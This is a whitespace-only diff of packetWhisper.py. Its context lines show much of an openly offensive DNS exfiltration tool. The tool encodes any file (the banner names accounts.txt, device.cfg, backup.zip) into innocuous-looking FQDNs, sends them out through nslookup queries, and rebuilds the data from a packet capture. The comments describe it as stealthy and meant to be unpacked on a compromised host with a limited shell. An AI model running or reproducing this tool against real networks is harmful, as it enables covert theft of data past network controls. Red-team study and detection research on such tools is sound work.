@@ -1,6 +1,6 @@
 #!/usr/bin/python
-# 
-# Filename:  packetWhisper.py 
+#
+# Filename:  packetWhisper.py
 #
 # Version: 1.0.0
 #
@@ -18,7 +18,7 @@
 # attacker-controlled destination is ever required) and stealthy exfiltration
 # when all other services are unavailable.
 #
-# Description:  
+# Description:
 #
 # Leverages Cloakify (https://github.com/TryCatchHCF/Cloakify) to turn any
 # file type in a list of Fully Qualified Domain Names (FQDNs), selected from
@@ -27,18 +27,18 @@
 # packetWhisper then generates seqential DNS queries for each FQDN, which
 # propagates the DNS query along the DNS resolution path.
 #
-# To capture the data, you just need visibility of the network traffic along 
-# the DNS resolution path, which can of course include a simple connected 
-# system capturing in promiscuous mode, or access to network appliances along 
+# To capture the data, you just need visibility of the network traffic along
+# the DNS resolution path, which can of course include a simple connected
+# system capturing in promiscuous mode, or access to network appliances along
 # the route, including external to the network / organization of origination.
 #
 # The captured pcap file is then loaded into packetWhisper, which parses
 # the pcap using the matching cipher used to encode during transmission.
-# The ciphered data is extracted from the pcap and then Decloakified to 
+# The ciphered data is extracted from the pcap and then Decloakified to
 # restore the file to its original form.
 #
 # =====  NOTE: VPNs Will Prevent Access To DNS Queries  =====
-# 
+#
 # If the transmitting system is using a VPN, then none of the DNS queries
 # will be available unless your point of capture is upstream from the VPN
 # exit node. That's obvious, but it also means if you're testing on your
@@ -48,14 +48,14 @@
 # =====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  =====
 #
 # If you have other datapaths available (HTTP outbound, etc.) then just use
-# the Cloakify project (GitHub project URL above) and its standard ciphers, 
+# the Cloakify project (GitHub project URL above) and its standard ciphers,
 # transfer normally.
 
 #
-# Example:  
+# Example:
 #
-#   $ python packetWhisper.py 
-# 
+#   $ python packetWhisper.py
+#
 
 import os, subprocess, sys, getopt, socket, re, random, datetime, time, cloakify, decloakify
 
@@ -77,9 +77,9 @@ gCommonFQDNCipherFiles = next(os.walk( gFilepathCommonFQDN ))[2]
 gCommonFQDNCipherFiles.sort()
 
 # Kludge Alert: ("Really, TryCatchHCF? We're not even in the first function yet!"
-# Yeah, I know. So, back to the kludge - various files are co-resident in the 
+# Yeah, I know. So, back to the kludge - various files are co-resident in the
 # subdomain_randomizer_scripts/ directory, and we just read them all in. The actual
-# cipher files lack a "." anywhere in their filename, so if we don't add filenames 
+# cipher files lack a "." anywhere in their filename, so if we don't add filenames
 # that contain ".", we'll have a list of only ciphers for the user to pick from.
 
 gRandomSubdomainFQDNCipherFiles  = []
@@ -104,16 +104,16 @@ gSubdomainRandomizerScripts.sort()
 #========================================================================
 #
 # CloakAndTransferFile()
-# 
-# High-level coordination function for encoding and transferring the 
+#
+# High-level coordination function for encoding and transferring the
 # selected file.
-# 
+#
 #========================================================================
 
 def CloakAndTransferFile():
 
 	# Reset this each time we pass through
-	global gCommonFQDNCipherSelected 
+	global gCommonFQDNCipherSelected
 	gCommonFQDNCipherSelected = False
 
 	# Perform payload selection, cipher selection, Cloakify the payload into FQDNs
@@ -131,7 +131,7 @@ def CloakAndTransferFile():
 		if choice == "y" or choice == "n":
 
 			invalidSelection = False
-			
+
 
 	if choice == "y":
 
@@ -190,8 +190,8 @@ def CloakAndTransferFile():
 #========================================================================
 #
 # SelectCipherAndCloakifyFile()
-# 
-# Walks user through the process of selecting payload file, which FQDN 
+#
+# Walks user through the process of selecting payload file, which FQDN
 # cipher to use, and then Cloakifies the payload into a list of FQDNs.
 #
 #========================================================================
@@ -247,9 +247,9 @@ def SelectCipherAndCloakifyFile():
 
 
 #========================================================================
-# 
+#
 # CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
-# 
+#
 # Helper method to invoke Cloakify() to transform the payload into the
 # list of FQDNs per selected FQDN cipher.
 #
@@ -278,7 +278,7 @@ def CloakifyPayload( sourceFile, cloakedFile, cipherFilePath ):
 #========================================================================
 #
 # SelectPacketWhisperMode( sourceFile, cloakedFile )
-# 
+#
 # Walks user through the selection of the cipher to use for Cloakifying
 # the payload.
 #
@@ -290,7 +290,7 @@ def SelectPacketWhisperMode( sourceFile, cloakedFile ):
 	cipherFilePath = ""
 	notDone = 1
 
-	while ( notDone ): 
+	while ( notDone ):
 
 		print ""
 		print "=======  Select PacketWhisper Transfer Mode  ======="
@@ -300,13 +300,13 @@ def SelectPacketWhisperMode( sourceFile, cloakedFile ):
 		print "3) [DISABLED] Common Website FQDNs    (DNS caching may block, NAT interferes)"
 		print "4) Help"
 		print ""
-	
+
 		invalidSelection = 1
-	
+
 		while ( invalidSelection ):
 			try:
 				choice = int( raw_input( "Selection: " ))
-	
+
 				if choice == 3:
 					print ""
 					print "Temporarily Disabled: Common Website FQDNs"
@@ -316,10 +316,10 @@ def SelectPacketWhisperMode( sourceFile, cloakedFile ):
 					invalidSelection = 0
 				else:
 					print selectionErrorMsg
-	
+
 			except ValueError:
 				print selectionErrorMsg
-	
+
 		if choice == 1:
 			cipherFilePath = SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile )
 			notDone = 0
@@ -359,11 +359,11 @@ def ModeHelp():
 	print "to transfer data beyond a NAT'd network device being, since the sending"
 	print "system's IP address isn't needed to identify the traffic."
 	print ""
-	print "These ciphers mimic the formats of various services that rely on" 
+	print "These ciphers mimic the formats of various services that rely on"
 	print "complex subdomains as a means to identify a session, user, cached"
 	print "content etc."
 	print ""
-	print "The first part of the subdomain name is actually a string from the cipher" 
+	print "The first part of the subdomain name is actually a string from the cipher"
 	print "list. The rest of the subdomain name is randomized to make each FQDN unique,"
 	print "which prevents DNS caching from shutting down the DNS query path prematurely."
 	print "We then add the domain name. We construct the FQDNs this way to look like"
@@ -423,7 +423,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 
 	cipherNum = SelectCipher( gRandomSubdomainFQDNCipherFiles )
 
-	cipherFilePath = gFilepathRandomizedSubdomainFQDN + gRandomSubdomainFQDNCipherFiles[ cipherNum ] 
+	cipherFilePath = gFilepathRandomizedSubdomainFQDN + gRandomSubdomainFQDNCipherFiles[ cipherNum ]
 
 	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
 
@@ -437,7 +437,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 	###
 	### However it's a really convenient way to correlate the cipher with its matching
 	### script. And now I must accept the fact that there's a brittle connection between
-	### the cipher's filename and the matching script filename. 
+	### the cipher's filename and the matching script filename.
 
 	scriptFilename = gRandomSubdomainFQDNCipherFiles[ cipherNum ] + ".py"
 
@@ -459,7 +459,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 #
 # SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
 #
-# After calling Cloakify with selected cipher, add a random formal title 
+# After calling Cloakify with selected cipher, add a random formal title
 # to thefront of each FQDN. Example "John.Smallberries.yoyodyne.com"
 # becomes "Dr.John.Smallberries.yoyodyne.com"
 #
@@ -476,7 +476,7 @@ def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):
 
 	cipherNum = SelectCipher( gRepeatedSubdomainFQDNCipherFiles )
 
-	cipherFilePath = gFilepathRepeatedUniqueFQDN + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ] 
+	cipherFilePath = gFilepathRepeatedUniqueFQDN + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ]
 
 	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
 
@@ -518,25 +518,25 @@ def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):
 # SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
 #
 # Since Common Website ciphers only have the source IP address as a way
-# to identify its queries from all the others on the network, I set 
+# to identify its queries from all the others on the network, I set
 # gCommonFQDNCipherSelected to True so that the code will transmit the
 # knock sequence at beginning and end of payload, helps us pick out the
 # transmitting host from the pcap later.
 #
-# Note: Since most environments are NAT'd at the perimeter (removing 
-# client's IP information), this mode is generally only useful for 
-# transferring data between systems connected to the same /24 local 
+# Note: Since most environments are NAT'd at the perimeter (removing
+# client's IP information), this mode is generally only useful for
+# transferring data between systems connected to the same /24 local
 # subnetwork.
 #
 #========================================================================
 
 def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
-	
+
 	global gCommonFQDNCipherSelected
 
 	cipherNum = SelectCipher( gCommonFQDNCipherFiles )
 
-	cipherFilePath = gFilepathCommonFQDN + gCommonFQDNCipherFiles[ cipherNum ] 
+	cipherFilePath = gFilepathCommonFQDN + gCommonFQDNCipherFiles[ cipherNum ]
 
 	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
 
@@ -583,14 +583,14 @@ def TransferCloakedFile( cloakedFile, queryDelay ):
 #
 # GenerateDNSQueries( cloakedFile, queryDelay )
 #
-# Leverages nslookup on host OS. Seems lazy, and is, but also lets us 
+# Leverages nslookup on host OS. Seems lazy, and is, but also lets us
 # leverage nslookup's implementation which has consistent behavior across
 # operating systems (timeouts, avoiding unwanted retries, caching, etc.)
 #
 # "But why not just use 'dnspython'?" Because it's one more thing to have
-# to import, brings a lot of baggage with it, and that's not how I like 
-# my operational tools to be structured. The way PacketWhisper is 
-# structured, I can get it running on a limited shell host just by 
+# to import, brings a lot of baggage with it, and that's not how I like
+# my operational tools to be structured. The way PacketWhisper is
+# structured, I can get it running on a limited shell host just by
 # tar'ing up the project and extracting on the target host.
 #
 # Adds a half-second delay between DNS queries to help address UDP out-of-order
@@ -610,14 +610,14 @@ def GenerateDNSQueries( cloakedFile, queryDelay ):
     		for fqdn in fqdnFile:
 
 			fqdnStr = fqdn.strip()
-			
+
 			# We don't care if the lookup fails, so carry on
 			try:
 				ret = subprocess.check_output( ['nslookup', fqdnStr] )
-				time.sleep( queryDelay )   
+				time.sleep( queryDelay )
 			except:
-				time.sleep( queryDelay )   
-		
+				time.sleep( queryDelay )
+
 			checkpoint = byteCount % 25
 
 			if byteCount > 0 and checkpoint == 0:
@@ -635,7 +635,7 @@ def GenerateDNSQueries( cloakedFile, queryDelay ):
 #
 # Creates a textfile with all of the DNS queries (UDP Port 53). Makes a
 # system call to either tcpdump or windump, depending on the OS selected
-# by the user. 
+# by the user.
 #
 #========================================================================
 
@@ -667,11 +667,11 @@ def ExtractDNSQueriesFromPCAP( pcapFile, osStr ):
 #
 # ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized )
 #
-# The fun stuff. Identify the PacketWhisper FQDN ciphers in the 
+# The fun stuff. Identify the PacketWhisper FQDN ciphers in the
 # collection of DNS queries, and reconstruct the Cloakified payload file
 # with the matches.
 #
-# cipherTag is the unique element association with some ciphers. For 
+# cipherTag is the unique element association with some ciphers. For
 # Random Subdomain FQDN ciphers it's the domain name. For Common FQDNs
 # it's the source IP address associated with the knock sequence. It
 # provides additional context when extracting cipher strings from a
@@ -689,7 +689,7 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 	except:
 		print ""
 		print "!!! Oh noes! Problem reading DNS queries from '", dnsQueriesFilename, "'"
-		print "!!! Verify the location of the file" 
+		print "!!! Verify the location of the file"
 		print ""
 		return
 
@@ -699,23 +699,23 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 	except:
 		print ""
 		print "!!! Oh noes! Problem reading '", cipherFilename, "'"
-		print "!!! Verify the location of the cipher file" 
+		print "!!! Verify the location of the cipher file"
 		print ""
 		return
 
 	try:
-		cloakedFile = open( cloakedFilename, "w" ) 
+		cloakedFile = open( cloakedFilename, "w" )
 	except:
 		print ""
 		print "!!! Oh noes! Problem reading '", cloakedFile, "'"
-		print "!!! Verify the location of the cipher file" 
+		print "!!! Verify the location of the cipher file"
 		print ""
 		return
 
 
 	# Activate "Elegance Mode" here - We don't have to extract the cipher
-	# string from the DNS query. Instead, we only need to know that a 
-	# cipher string *appears* in the query. Then we can simply add the 
+	# string from the DNS query. Instead, we only need to know that a
+	# cipher string *appears* in the query. Then we can simply add the
 	# corresponding cipher string to the cloaked payload file, because
 	# inference. \o/
 
@@ -738,7 +738,7 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 
 			if foundQuery1 or foundQuery2:
 
-				# Now match those hits to DNS queries that also contain the cipher 
+				# Now match those hits to DNS queries that also contain the cipher
 				# tag. This may seem redundant to the re.search() above, but since
 				# the cipher tag may appear before or after that "A?" element, we
 				# use a different regex base string ("IP ") that will always appear
@@ -748,11 +748,11 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 
 				if found:
 
-					# Confirmed match, minimized the risk of "bad luck" false 
-					# positives. Add the cipher element to the extracted cloaked 
+					# Confirmed match, minimized the risk of "bad luck" false
+					# positives. Add the cipher element to the extracted cloaked
 					# file that we'll later pass to Decloakify()
 
-					queryElements = dnsQuery.split()	
+					queryElements = dnsQuery.split()
 					fqdnElements = queryElements[ 7 ].split( '.' )
 					subdomain = fqdnElements[ 0 ]
 
@@ -763,7 +763,7 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 						cloakedFile.write( cipherElement )
 
 					elif not isRandomized:
-		
+
 						cloakedFile.write( cipherElement )
 
 					previousSubdomain = subdomain
@@ -839,8 +839,8 @@ def ExtractCapturedPayload():
 	cipherTag = ""
 
 	# isRandomized lets us track if the cipher is randomized and therefore
-	# for all practical purposes there will never be adjacent duplicate 
-	# FQDNs in the PCAP file. This is a really simple way of identifying and 
+	# for all practical purposes there will never be adjacent duplicate
+	# FQDNs in the PCAP file. This is a really simple way of identifying and
 	# skipping duplicate DNS queries
 
 	isRandomized = True
@@ -863,7 +863,7 @@ def ExtractCapturedPayload():
 
 
 	# If it's a Common FQDN cipher, we have to use the embedded knock sequence
-	# to determine the correct source IP address amidst a possible sea of 
+	# to determine the correct source IP address amidst a possible sea of
 	# duplicate requests. New cipherTag will be the source IP address of the
 	# knock sequence in pcap.
 
@@ -902,7 +902,7 @@ def ExtractCapturedPayload():
 # Cloakifying and transmitting the payload, but for now those two workflows
 # do not share code. Will refactor for cleaner design in the next update.
 #
-# In the meantime, having two different flows allows me to tailor the 
+# In the meantime, having two different flows allows me to tailor the
 # menu for better user context.
 #
 #========================================================================
@@ -913,7 +913,7 @@ def SelectCipherForExtraction():
 	cipherFilePath = ""
 	notDone = 1
 
-	while ( notDone ): 
+	while ( notDone ):
 
 		print ""
 		print "=======  Select PacketWhisper Cipher Used For Transfer  ======="
@@ -922,13 +922,13 @@ def SelectCipherForExtraction():
 		print "2) Unique Repeating FQDNs  (example: John.Whorfin.yoyodyne.com)"
 		print "3) [DISABLED] Common Website FQDNs    (example: www.youtube.com)"
 		print ""
-	
+
 		invalidSelection = 1
-	
+
 		while ( invalidSelection ):
 			try:
 				choice = int( raw_input( "Selection: " ))
-	
+
 				if choice == 3:
 					print ""
 					print "Temporarily Disabled: Common Website FQDNs"
@@ -938,7 +938,7 @@ def SelectCipherForExtraction():
 					invalidSelection = 0
 				else:
 					print selectionErrorMsg
-	
+
 			except ValueError:
 				print selectionErrorMsg
 
@@ -967,12 +967,12 @@ def SelectCipherForExtraction():
 #
 # GetSourceIPViaKnockSequence( dnsQueriesFile )
 #
-# Extracts the source IP address of the system that queried for the 
+# Extracts the source IP address of the system that queried for the
 # knock sequence. We then use that value as the cipher tag while
 # extracting Common FQDN ciphers from the PCAP file, since otherwise
-# we'd have no idea how to tell the difference between all those other 
-# systems querying for common FQDNs. 
-# 
+# we'd have no idea how to tell the difference between all those other
+# systems querying for common FQDNs.
+#
 #========================================================================
 
 def GetSourceIPViaKnockSequence( dnsQueriesFilename ):
@@ -993,7 +993,7 @@ def GetSourceIPViaKnockSequence( dnsQueriesFilename ):
 	except:
 		print ""
 		print "!!! Oh noes! Problem reading '", dnsQueriesFile, "'"
-		print "!!! Verify the location of the DNS queries file" 
+		print "!!! Verify the location of the DNS queries file"
 		print ""
 		return
 
@@ -1002,7 +1002,7 @@ def GetSourceIPViaKnockSequence( dnsQueriesFilename ):
 		found = re.search(r"A\? " + knockSequenceStr + "?", dnsQuery)
 
 			# Found the knock sequence in the DNS queries
-			# Extract and return the source IP address 
+			# Extract and return the source IP address
 
 		if found:
 
@@ -1016,7 +1016,7 @@ def GetSourceIPViaKnockSequence( dnsQueriesFilename ):
 
 			# Generally not a fan of returns within loops, but here we are...
 			return sourceIPAddrStr
-	
+
 	return sourceIPAddrStr
 
 
@@ -1027,7 +1027,7 @@ def GetSourceIPViaKnockSequence( dnsQueriesFilename ):
 #
 # Straightforward call to Decloakify to restore the payload to its
 # original form.
-# 
+#
 #========================================================================
 
 def DecloakifyFile( cloakedFile, cipherFilePath ):
@@ -1065,7 +1065,7 @@ def DecloakifyFile( cloakedFile, cipherFilePath ):
 #========================================================================
 
 def TestDNSAccess():
-	
+
 	defaultFQDNStr = "www.google.com"
 	addr = ""
 
@@ -1095,7 +1095,7 @@ def TestDNSAccess():
 # SelectCipher( cipherFiles )
 #
 # Helper method to prompt the user to select from a list of available
-# ciphers. 
+# ciphers.
 #
 #========================================================================
 
@@ -1119,10 +1119,10 @@ def SelectCipher( cipherFiles ):
 
 			selection = int ( cipherNum ) - 1
 
-			if ( cipherNum == "" or selection < 0 or selection > (cipherCount - 1)): 
-				print "Invalid cipher number, try again..." 
+			if ( cipherNum == "" or selection < 0 or selection > (cipherCount - 1)):
+				print "Invalid cipher number, try again..."
 				selection = -1
-	
+
 		except ValueError:
 			print "Invalid cipher number, try again..."
 	print ""
@@ -1231,7 +1231,7 @@ def Help():
 	ModeHelp()
 
 	return()
-	
+
 
 #========================================================================
 #
@@ -1263,7 +1263,7 @@ def PrintBanner():
 	print " (      ' '  )        data.xls accounts.txt \\     Series of "
 	print "  \ (  \_Y_/\\        device.cfg  backup.zip  -->  harmless-looking "
 	print "   \"\"\ \___//         LoadMe.war file.doc   /     DNS queries "
-	print "      `w   \""   
+	print "      `w   \""
 
 	return
 
@@ -1281,7 +1281,7 @@ def MainMenu():
 	selectionErrorMsg = "1-5 are your options. Try again."
 	notDone = 1
 
-	while ( notDone ): 
+	while ( notDone ):
 
 		print ""
 		print "====  PacketWhisper Main Menu  ===="
@@ -1292,21 +1292,21 @@ def MainMenu():
 		print "4) Help / About"
 		print "5) Exit"
 		print ""
-	
+
 		invalidSelection = 1
-	
+
 		while ( invalidSelection ):
 			try:
 				choice = int( raw_input( "Selection: " ))
-	
+
 				if ( choice > 0 and choice < 6 ):
 					invalidSelection = 0
 				else:
 					print selectionErrorMsg
-	
+
 			except ValueError:
 				print selectionErrorMsg
-	
+
 		if choice == 1:
 			CloakAndTransferFile()
 		elif choice == 2:
@@ -1319,7 +1319,7 @@ def MainMenu():
 			notDone = 0
 		else:
 			print selectionErrorMsg
-	
+
 	# Wherever you are on this floating space orb we call home, I hope you are well
 
 	byeArray = ("Bye!", "Ciao!", "Adios!", "Aloha!", "Hei hei!", "Bless bless!", "Hej da!", "Tschuss!", "Adieu!", "Cheers!")
